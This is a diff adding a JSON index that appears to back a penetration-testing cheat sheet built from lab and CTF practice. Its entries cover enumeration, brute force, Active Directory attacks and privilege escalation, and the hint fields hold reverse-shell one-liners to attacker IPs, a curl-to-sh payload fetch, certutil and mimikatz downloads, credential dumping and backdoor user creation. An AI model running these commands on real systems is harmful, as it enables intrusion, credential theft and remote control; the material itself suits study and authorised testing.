@@ -1,0 +1,884 @@
+[
+    {
+        "name":  "exiftool",
+        "category":  "Enumeration",
+        "section":  "Metadata",
+        "hint":  "exiftool file",
+        "slug":  "exiftool"
+    },
+    {
+        "name":  "Grabbing usernames",
+        "category":  "Enumeration",
+        "section":  "Local Enumeration Scripts",
+        "hint":  "grep sh$ /etc/passwd",
+        "slug":  "grabbing-usernames"
+    },
+    {
+        "name":  "Finding SUID binaries",
+        "category":  "Enumeration",
+        "section":  "Local Enumeration Scripts",
+        "hint":  "find / -perm -4000 -type f 2\u003e/dev/null",
+        "slug":  "finding-suid-binaries"
+    },
+    {
+        "name":  "AWS secret s3",
+        "category":  "Enumeration",
+        "section":  "Cloud / AWS",
+        "hint":  "aws configure",
+        "slug":  "aws-secret-s3"
+    },
+    {
+        "name":  "metasploit",
+        "category":  "Enumeration",
+        "section":  "Redis",
+        "hint":  "use auxiliary/scanner/redis/redis_server",
+        "slug":  "metasploit"
+    },
+    {
+        "name":  "Connecting",
+        "category":  "Enumeration",
+        "section":  "Redis",
+        "hint":  "redis-cli -h target.com",
+        "slug":  "connecting"
+    },
+    {
+        "name":  "Spawning webshell",
+        "category":  "Enumeration",
+        "section":  "Redis",
+        "hint":  "Method 1: PHP webshell",
+        "slug":  "spawning-webshell"
+    },
+    {
+        "name":  "Redis RCE",
+        "category":  "Enumeration",
+        "section":  "Redis",
+        "hint":  "RCE:https://github.com/Ridter/redis-rce",
+        "slug":  "redis-rce"
+    },
+    {
+        "name":  "Using a key",
+        "category":  "Enumeration",
+        "section":  "SSH",
+        "hint":  "nano id_rsa",
+        "slug":  "using-a-key"
+    },
+    {
+        "name":  "Cracking a key",
+        "category":  "Enumeration",
+        "section":  "SSH",
+        "hint":  "$ ssh2john id_ed25519",
+        "slug":  "cracking-a-key"
+    },
+    {
+        "name":  "Old SSH Algorithms",
+        "category":  "Enumeration",
+        "section":  "SSH",
+        "hint":  "ssh -oKexAlgorithms=+diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 -oHostKeyAlgorithms=+ssh-rsa root@be...",
+        "slug":  "old-ssh-algorithms"
+    },
+    {
+        "name":  "Going through nmap scripts",
+        "category":  "Enumeration",
+        "section":  "Nmap",
+        "hint":  "ls -al /usr/share/nmap/scripts/ | grep ftp-",
+        "slug":  "going-through-nmap-scripts"
+    },
+    {
+        "name":  "Top UDP",
+        "category":  "Enumeration",
+        "section":  "Nmap",
+        "hint":  "nmap 10.129.18.188 -sU -top-ports=100 --min-rate=20000",
+        "slug":  "top-udp"
+    },
+    {
+        "name":  "Useful Switches",
+        "category":  "Enumeration",
+        "section":  "Nmap",
+        "hint":  "- sn Ping sweep",
+        "slug":  "useful-switches"
+    },
+    {
+        "name":  "Port Knocking",
+        "category":  "Enumeration",
+        "section":  "Nmap",
+        "hint":  "for i in 571 290 911; do",
+        "slug":  "port-knocking"
+    },
+    {
+        "name":  "Filtered Ports",
+        "category":  "Enumeration",
+        "section":  "Nmap",
+        "hint":  "nmap -p- --min-rate 10000 \u003cip\u003e",
+        "slug":  "filtered-ports"
+    },
+    {
+        "name":  "Gobuster",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "gobuster dir -u \u003chttp://10.129.229.27/\u003e -w /home/kali/Desktop/SecLists/Discovery/Web-Content/DirBuster-2007_directory-li...",
+        "slug":  "gobuster"
+    },
+    {
+        "name":  "Dirb",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "dirb \u003chttp://192.168.1.224/\u003e /usr/share/wordlists/dirb/common.txt",
+        "slug":  "dirb"
+    },
+    {
+        "name":  "Feroxbuster",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "feroxbuster -u \u003chttp://10.10.11.220\u003e -x php",
+        "slug":  "feroxbuster"
+    },
+    {
+        "name":  "Sublist3r",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "sublist3r -d website -e google,yahoo",
+        "slug":  "sublist3r"
+    },
+    {
+        "name":  "Wfuzz",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "wfuzz -u \u003chttp://10.129.18.188\u003e -H \"Host: FUZZ.pandora.htb\" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-...",
+        "slug":  "wfuzz"
+    },
+    {
+        "name":  "Php filter",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "\u003chttps://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=master.php:\u003e",
+        "slug":  "php-filter"
+    },
+    {
+        "name":  "Ffuf",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "",
+        "slug":  "ffuf"
+    },
+    {
+        "name":  "Username Enumeration",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d \"username=FUZZ\u0026email=x\u0026password=x\u0026cpassword=x...",
+        "slug":  "username-enumeration"
+    },
+    {
+        "name":  "Subdomain Enum",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "ffuf -u \u003chttp://builder.htb/\u003e -H \"Host: FUZZ.trackbox.scipiosoft.com\" -w /home/kali/Desktop/SecLists/Discovery/DNS/subdo...",
+        "slug":  "subdomain-enum"
+    },
+    {
+        "name":  "Bruteforcing",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "ffuf -w valid_usernames.txt:W1 -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-to...",
+        "slug":  "bruteforcing"
+    },
+    {
+        "name":  "Dirbusting",
+        "category":  "Enumeration",
+        "section":  "Web Enumeration",
+        "hint":  "ffuf -u \u003chttp://editorial.htb/FUZZ\u003e -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e .php,.txt,.bak,.o...",
+        "slug":  "dirbusting"
+    },
+    {
+        "name":  "SMB",
+        "category":  "Enumeration",
+        "section":  "Service Enumeration",
+        "hint":  "smbclient -L \\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\192.91.46.3\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\ -U admin",
+        "slug":  "smb"
+    },
+    {
+        "name":  "CrackMapExec",
+        "category":  "Enumeration",
+        "section":  "Service Enumeration",
+        "hint":  "crackmapexec smb support.htb",
+        "slug":  "crackmapexec"
+    },
+    {
+        "name":  "OpenSSL",
+        "category":  "Enumeration",
+        "section":  "Service Enumeration",
+        "hint":  "openssl s_client -connect sequel.htb:3269",
+        "slug":  "openssl"
+    },
+    {
+        "name":  "OpenSSL - Extracting the loot",
+        "category":  "Enumeration",
+        "section":  "Service Enumeration",
+        "hint":  "oxdf@hacky$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc",
+        "slug":  "openssl-extracting-the-loot"
+    },
+    {
+        "name":  "MSSQL",
+        "category":  "Enumeration",
+        "section":  "Service Enumeration",
+        "hint":  "python mssqlclient.py sequel.htb/PublicUser:GuestUserCantWrite1@dc.sequel.htb",
+        "slug":  "mssql"
+    },
+    {
+        "name":  "MYSQL",
+        "category":  "Enumeration",
+        "section":  "Postgres",
+        "hint":  "mysql -h 127.0.0.1 -P 3306 -u tiffany -p\u0027BackDropJ2024DS2024\u0027",
+        "slug":  "mysql"
+    },
+    {
+        "name":  "SNMP",
+        "category":  "Enumeration",
+        "section":  "Postgres",
+        "hint":  "snmp-check 10.10.10.10",
+        "slug":  "snmp"
+    },
+    {
+        "name":  "RPC-client",
+        "category":  "Enumeration",
+        "section":  "SMTP",
+        "hint":  "rpcclient -U \"\" -N 10.10.10.172",
+        "slug":  "rpc-client"
+    },
+    {
+        "name":  "GitDump",
+        "category":  "Enumeration",
+        "section":  "SMTP",
+        "hint":  "python3 -m venv venv",
+        "slug":  "gitdump"
+    },
+    {
+        "name":  "LDAP \u0026 ldapdomaindump",
+        "category":  "Enumeration",
+        "section":  "SMTP",
+        "hint":  "ldapsearch -x -H ldap://10.129.230.96 -b \"dc=monitored,dc=htb\"",
+        "slug":  "ldap-ldapdomaindump"
+    },
+    {
+        "name":  "http-proxy enumeration",
+        "category":  "Enumeration",
+        "section":  "",
+        "hint":  "#To scan itself on port 443",
+        "slug":  "http-proxy-enumeration"
+    },
+    {
+        "name":  "NXC",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "nxc ssh 10.10.11.58 -u users.txt -p \u0027BackDrop\u0027",
+        "slug":  "nxc"
+    },
+    {
+        "name":  "WPSCAN",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "wpsacn --url \u003chttp://internal.thm/wordpress\u003e -U userlist.txt --passwords /usr/share/wordlists/rockyou.txt",
+        "slug":  "wpscan"
+    },
+    {
+        "name":  "Burp",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "After sending to intruder, add your payload positions",
+        "slug":  "burp"
+    },
+    {
+        "name":  "SSH",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra -L users.txt -P passwords.txt 192.168.122.122 ssh -t4 -vV",
+        "slug":  "ssh"
+    },
+    {
+        "name":  "PHPMyAdmin Example",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra 10.10.10.43 -l 0xdf -P /usr/share/seclists/Passwords/twitter-banned.txt https-post-form \"/db/index.php:password=^P...",
+        "slug":  "phpmyadmin-example"
+    },
+    {
+        "name":  "Rails Example",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra -l admin -P passwords.txt facts.htb http-post-form \"/admin/login:authenticity_token=TOKEN\u0026user[username]=^USER^\u0026us...",
+        "slug":  "rails-example"
+    },
+    {
+        "name":  "Redirect Example",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra -l admin -P rockyou.txt facts.htb http-post-form \"/admin/login:authenticity_token=TOKEN\u0026user[username]=^USER^\u0026user...",
+        "slug":  "redirect-example"
+    },
+    {
+        "name":  "FTP",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra -L users.txt -P passwords.txt 192.x.x.x ftp",
+        "slug":  "ftp"
+    },
+    {
+        "name":  "Normal Login Form",
+        "category":  "Credential Attacks",
+        "section":  "Hydra",
+        "hint":  "hydra -l info -P /usr/share/wordlists/rockyou.txt cozyhosting.htb http-post-form \"/login:username=^USER^\u0026password=^PASS^...",
+        "slug":  "normal-login-form"
+    },
+    {
+        "name":  "FFUF",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "ffuf -u \u003chttp://linkvortex.htb/ghost/api/admin/session\u003e -X POST -H \"Content-Type: application/json\" -H \"X-Ghost-Version:...",
+        "slug":  "ffuf"
+    },
+    {
+        "name":  "Medusa",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "medusa -h 192.168.126.29 -u admin -P /usr/share/wordlists/rockyou.txt \\",
+        "slug":  "medusa"
+    },
+    {
+        "name":  "CrackMapExec",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "crackmapexec winrm -u administrator -p tinkerbell -x \"whoami\"",
+        "slug":  "crackmapexec"
+    },
+    {
+        "name":  "John",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt",
+        "slug":  "john"
+    },
+    {
+        "name":  "Hashcat",
+        "category":  "Credential Attacks",
+        "section":  "",
+        "hint":  "hashcat -m 5600 hash.txt rockyou.txt",
+        "slug":  "hashcat"
+    },
+    {
+        "name":  "Certutil",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "certutil -urlcache -split -f \"\u003chttp://example.com/file.exe\u003e\" [LocalPath]",
+        "slug":  "certutil"
+    },
+    {
+        "name":  "PrintSpoofer - Standard Windows 2019",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "PrintSpoofer32.exe -i -c cmd.exe or powershell.exe",
+        "slug":  "printspoofer-standard-windows-2019"
+    },
+    {
+        "name":  "WinExploitSuggester",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "python3 wes.py -u",
+        "slug":  "winexploitsuggester"
+    },
+    {
+        "name":  "Mimikatz",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "Invoke-WebRequest \u003chttp://10.10.14.28:8081/mimikatz.exe\u003e -OutFile C:\\\\\\\\\\\\\\\\Users\\\\\\\\\\\\\\\\Public\\\\\\\\\\\\\\\\mimikatz.exe",
+        "slug":  "mimikatz"
+    },
+    {
+        "name":  "PowerUp.ps1",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "wget PowerUp.ps1 -o PowerUp.ps1",
+        "slug":  "powerupps1"
+    },
+    {
+        "name":  "UAC Bypass",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "if we are part of the administrator group but have mandatory lervel medium",
+        "slug":  "uac-bypass"
+    },
+    {
+        "name":  "PrintNightmare",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "Try this maybe it works sometimes",
+        "slug":  "printnightmare"
+    },
+    {
+        "name":  "Add User to Local Admin",
+        "category":  "Exploitation",
+        "section":  "Windows PrivEsc Helpers",
+        "hint":  "net localgroup \"administrators\" adiaz /add",
+        "slug":  "add-user-to-local-admin"
+    },
+    {
+        "name":  "pwnkit",
+        "category":  "Exploitation",
+        "section":  "Payloads / Generators",
+        "hint":  "sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)\"",
+        "slug":  "pwnkit"
+    },
+    {
+        "name":  "msfvenom",
+        "category":  "Exploitation",
+        "section":  "Payloads / Generators",
+        "hint":  "msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp \u003e shell.asp",
+        "slug":  "msfvenom"
+    },
+    {
+        "name":  "SQLMAP",
+        "category":  "Exploitation",
+        "section":  "Payloads / Generators",
+        "hint":  "sqlmap -r req.txt --batch --level 3 --risk 2",
+        "slug":  "sqlmap"
+    },
+    {
+        "name":  "Filter Bypass Techniques",
+        "category":  "Exploitation",
+        "section":  "Payloads / Generators",
+        "hint":  "For white spaces we can use",
+        "slug":  "filter-bypass-techniques"
+    },
+    {
+        "name":  "PowerView",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  ". .\\Powerview.ps1",
+        "slug":  "powerview"
+    },
+    {
+        "name":  "Adding A DNS Record",
+        "category":  "Active Directory",
+        "section":  "DNS / GMSA",
+        "hint":  "dnstool.py -u \u0027intelligence\\\\\\\\Tiffany.Molina\u0027 -p NewIntelligenceCorpUser9876 10.129.95.154 -a add -r web1 -d 10.10.14.1...",
+        "slug":  "adding-a-dns-record"
+    },
+    {
+        "name":  "GMSA DUMP",
+        "category":  "Active Directory",
+        "section":  "DNS / GMSA",
+        "hint":  "python gMSADumper/gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb -l",
+        "slug":  "gmsa-dump"
+    },
+    {
+        "name":  "BloodHound Setup",
+        "category":  "Active Directory",
+        "section":  "BloodHound",
+        "hint":  "sudo apt install -y neo4j",
+        "slug":  "bloodhound-setup"
+    },
+    {
+        "name":  "Collection with bloodyad",
+        "category":  "Active Directory",
+        "section":  "BloodHound",
+        "hint":  "bloodyAD -d secura.yzx -u Eric.Wallows -p \u0027EricLikesRunning800\u0027 --host dc01.secura.yzx --dc-ip 192.168.122.97 --dns 192....",
+        "slug":  "collection-with-bloodyad"
+    },
+    {
+        "name":  "Collection",
+        "category":  "Active Directory",
+        "section":  "BloodHound",
+        "hint":  "nxc ldap 192.168.122.97 -u Eric.Wallows -p \u0027EricLikesRunning800\u0027 -d secura.yzx --dns-server 192.168.122.97 --bloodhound ...",
+        "slug":  "collection"
+    },
+    {
+        "name":  "DOCKER",
+        "category":  "Active Directory",
+        "section":  "BloodHound",
+        "hint":  "sudo apt update",
+        "slug":  "docker"
+    },
+    {
+        "name":  "Sharphound if needed",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "cp /usr/lib/bloodhound/resources/app/Collectors/SharpHound.ps1 .",
+        "slug":  "sharphound-if-needed"
+    },
+    {
+        "name":  "Rubeus",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "Rubeus.exe asktgt /user:administrator /certificate:C:\\\\\\\\\\\\\\\\programdata\\\\\\\\\\\\\\\\cert.pfx",
+        "slug":  "rubeus"
+    },
+    {
+        "name":  "Certify / Certipy-ad",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "netexec ldap \u003cDC_IP\u003e -u user -p \u0027password\u0027 -M adcs",
+        "slug":  "certify-certipy-ad"
+    },
+    {
+        "name":  "Responder",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "sudo responder -I tun0",
+        "slug":  "responder"
+    },
+    {
+        "name":  "NTLMtheft",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "python3 ntlm_theft.py -g lnk -s 192.168.45.160 -f vault",
+        "slug":  "ntlmtheft"
+    },
+    {
+        "name":  "Enum4linux",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "enum4linux -a $target",
+        "slug":  "enum4linux"
+    },
+    {
+        "name":  "ASEP-ROASTING",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "impacket-GetNPUsers vulnnet-rst.local/ -dc-ip $target -usersfile usernames.txt -format john -outputfile hashes.txt",
+        "slug":  "asep-roasting"
+    },
+    {
+        "name":  "Kerberoasting",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "impacket-GetUserSPNs -dc-ip $target \u0027vulnet-rst.local/t-skid:tj072889=\u0027 -request",
+        "slug":  "kerberoasting"
+    },
+    {
+        "name":  "Kerbrute username eval",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "/home/kali/Desktop/Boxes/Administrator/kerbrute userenum --dc 10.129.16.174 -d manager.htb users2.txt",
+        "slug":  "kerbrute-username-eval"
+    },
+    {
+        "name":  "Targeted Kerberoasting",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "source venv/bin/activate",
+        "slug":  "targeted-kerberoasting"
+    },
+    {
+        "name":  "DNSrecon",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "dnsrecon -d \u0027EGOTISTICAL_BANK.LOCAL\u0027 -n $target",
+        "slug":  "dnsrecon"
+    },
+    {
+        "name":  "RID brute / Username Enum",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "git clone \u003chttps://github.com/mohinparamasivam/AD-Username-Generator\u003e",
+        "slug":  "rid-brute-username-enum"
+    },
+    {
+        "name":  "PSEXEC / WMIEEXEC / PASSTHEHASH",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "rlwrap impacket-psexec vulnnet-rst.local/a-whitehat:bNdKVKjv@$target",
+        "slug":  "psexec-wmieexec-passthehash"
+    },
+    {
+        "name":  "Secretsdump-DCSYNC",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "impacket-secretsdump -just-dc-ntlm vulnnet-rst.local/whitehat:\u0027akdfjakfaklf\u0027@$target",
+        "slug":  "secretsdump-dcsync"
+    },
+    {
+        "name":  "Checking smb w Creds",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "crackmapexec smb #target -u \u0027ADministrator\u0027 -H or -P",
+        "slug":  "checking-smb-w-creds"
+    },
+    {
+        "name":  "Checking smb Anon",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "netexec smb $target -u -p \u0027\u0027",
+        "slug":  "checking-smb-anon"
+    },
+    {
+        "name":  "WMI ANON",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "rpcclient -u \"\" -n $target",
+        "slug":  "wmi-anon"
+    },
+    {
+        "name":  "Shadow Creds w Certipy \u003e GenericAll",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "certipy-ad shadow auto -u krishna@ignite.local -p Password@1 -account management_svc",
+        "slug":  "shadow-creds-w-certipy-genericall"
+    },
+    {
+        "name":  "PGP",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "gpg --decrypt credential.pgp",
+        "slug":  "pgp"
+    },
+    {
+        "name":  "Cadaver",
+        "category":  "Active Directory",
+        "section":  "",
+        "hint":  "cadaver http://192.168.45.159",
+        "slug":  "cadaver"
+    },
+    {
+        "name":  "Check Routing Table",
+        "category":  "Access and Pivoting",
+        "section":  "",
+        "hint":  "route print",
+        "slug":  "check-routing-table"
+    },
+    {
+        "name":  "Switching Users",
+        "category":  "Access and Pivoting",
+        "section":  "",
+        "hint":  ". .\\Invoke-RunasCs.ps1",
+        "slug":  "switching-users"
+    },
+    {
+        "name":  "Discovery",
+        "category":  "Access and Pivoting",
+        "section":  "",
+        "hint":  "route",
+        "slug":  "discovery"
+    },
+    {
+        "name":  "sshuttle",
+        "category":  "Access and Pivoting",
+        "section":  "Access",
+        "hint":  "sshuttle -r user@IP 10.129.4.0/24|",
+        "slug":  "sshuttle"
+    },
+    {
+        "name":  "chisel",
+        "category":  "Access and Pivoting",
+        "section":  "Access",
+        "hint":  "./chisel server -p 8000 --reverse",
+        "slug":  "chisel"
+    },
+    {
+        "name":  "Ligolo",
+        "category":  "Access and Pivoting",
+        "section":  "Access",
+        "hint":  "grab ligolo proxy and agent, proxy on the linux",
+        "slug":  "ligolo"
+    },
+    {
+        "name":  "SEBackupPrivilege",
+        "category":  "Access and Pivoting",
+        "section":  "Sensitive Store / Dumps",
+        "hint":  "On kali create a file called viper.dsh",
+        "slug":  "sebackupprivilege"
+    },
+    {
+        "name":  "netexec - Hashdump - CREDS",
+        "category":  "Access and Pivoting",
+        "section":  "Sensitive Store / Dumps",
+        "hint":  "netexec smb $target -u \u0027admin\u0027 -p \u0027Password\u0027 -M nanodump --\u003e to dump lsass",
+        "slug":  "netexec-hashdump-creds"
+    },
+    {
+        "name":  "Keepass",
+        "category":  "Access and Pivoting",
+        "section":  "Sensitive Store / Dumps",
+        "hint":  "keepass2john",
+        "slug":  "keepass"
+    },
+    {
+        "name":  "webshell aspx",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "/usr/share/webshells/aspx/cmdasp.aspx",
+        "slug":  "webshell-aspx"
+    },
+    {
+        "name":  "postgres revshell",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "https://github.com/squid22/PostgreSQL_RCE",
+        "slug":  "postgres-revshell"
+    },
+    {
+        "name":  "Linux Upgrade",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "python -c \u0027import pty; pty.spawn(\"/bin/bash\")\u0027",
+        "slug":  "linux-upgrade"
+    },
+    {
+        "name":  "Base64",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "base64 -d password.txt",
+        "slug":  "base64"
+    },
+    {
+        "name":  "Python reverse shell",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "python -c \u0027import socket,os,pty;s=socket.socket();s.connect((\"YOUR_HTB_IP\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno...",
+        "slug":  "python-reverse-shell"
+    },
+    {
+        "name":  "Bash reverse shell",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "bash -c \u0027bash -i \u003e\u0026 /dev/tcp/YOUR_HTB_IP/4444 0\u003e\u00261\u0027",
+        "slug":  "bash-reverse-shell"
+    },
+    {
+        "name":  "NC reverse shell",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "nc YOUR_HTB_IP 4444 -e /bin/bash",
+        "slug":  "nc-reverse-shell"
+    },
+    {
+        "name":  "PHP reverse shell",
+        "category":  "Shells",
+        "section":  "simple cron",
+        "hint":  "\u003c?php echo YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMTA0LzQ0NDQgMD4mMSAK|base64 -d |bash; ?\u003e",
+        "slug":  "php-reverse-shell"
+    },
+    {
+        "name":  "ncat",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "ncat -e /bin/bash 192.168.1.44 1234",
+        "slug":  "ncat"
+    },
+    {
+        "name":  "BusyBox",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "http://plan.bitforge.lab/www//upload/files/5hjchl/u69.php?cmd=busybox%20nc%20192.168.45.159%203306%20-e%20bash",
+        "slug":  "busybox"
+    },
+    {
+        "name":  "Socat Upgrade",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "socat file:tty,raw,echo=0 tcp-listen:4444 --\u003eattacker",
+        "slug":  "socat-upgrade"
+    },
+    {
+        "name":  "LibreOffice revshell ODT",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "https://medium.com/@Dpsypher/proving-grounds-practice-craft-4a62baf140cc",
+        "slug":  "libreoffice-revshell-odt"
+    },
+    {
+        "name":  "linux",
+        "category":  "Shells",
+        "section":  "Upgrade Through Python Server",
+        "hint":  "cat \u003c\u003cEOF \u003e rev.sh",
+        "slug":  "linux"
+    },
+    {
+        "name":  "windows",
+        "category":  "Shells",
+        "section":  "RCE Rev shell",
+        "hint":  "certutil -urlcache -split -f http://192.168.45.159:80/nc.exe C:/Users/Public/Documents/nc.exe",
+        "slug":  "windows"
+    },
+    {
+        "name":  "WordPress",
+        "category":  "Shells",
+        "section":  "",
+        "hint":  "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.150 LPORT=4444 -f exe -o 64.exe",
+        "slug":  "wordpress"
+    },
+    {
+        "name":  "Transferring with SMB",
+        "category":  "File Transfer",
+        "section":  "",
+        "hint":  "On host",
+        "slug":  "transferring-with-smb"
+    },
+    {
+        "name":  "Transferring with NC",
+        "category":  "File Transfer",
+        "section":  "",
+        "hint":  "on kali",
+        "slug":  "transferring-with-nc"
+    },
+    {
+        "name":  "Transferring with scp",
+        "category":  "File Transfer",
+        "section":  "",
+        "hint":  "scp /path/to/local/file username@remote_host:/path/to/remote/directory",
+        "slug":  "transferring-with-scp"
+    },
+    {
+        "name":  "Library",
+        "category":  "MISC",
+        "section":  "Client Side Attacks",
+        "hint":  "mkdir /home/kali/beyond/webdav",
+        "slug":  "library"
+    },
+    {
+        "name":  "Executing phar rev shell",
+        "category":  "MISC",
+        "section":  "",
+        "hint":  "?page=phar:///var/www/html/uploads/archive.phar/test.txt",
+        "slug":  "executing-phar-rev-shell"
+    },
+    {
+        "name":  "LFI to RCE",
+        "category":  "MISC",
+        "section":  "",
+        "hint":  "https://medium.com/@lashin0x/local-file-inclusion-to-remote-code-execution-rce-bea0ec06342a",
+        "slug":  "lfi-to-rce"
+    },
+    {
+        "name":  "Using Arson",
+        "category":  "MISC",
+        "section":  "",
+        "hint":  "docker-compose up -d",
+        "slug":  "using-arson"
+    },
+    {
+        "name":  "Persistence",
+        "category":  "MISC",
+        "section":  "",
+        "hint":  "net user fatcat fatcat1234 /add",
+        "slug":  "persistence"
+    },
+    {
+        "name":  "SigmaPotato",
+        "category":  "Potatoes",
+        "section":  "",
+        "hint":  "",
+        "slug":  "sigmapotato"
+    },
+    {
+        "name":  "JuicyPotato",
+        "category":  "Potatoes",
+        "section":  "",
+        "hint":  "**msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.45.159 LPORT=1338 -f exe -o shell.exe",
+        "slug":  "juicypotato"
+    },
+    {
+        "name":  "GodPotato",
+        "category":  "Potatoes",
+        "section":  "",
+        "hint":  "\\godpotato.exe -cmd \"nc.exe -e cmd 192.168.45.239 1338\"",
+        "slug":  "godpotato"
+    }
+]
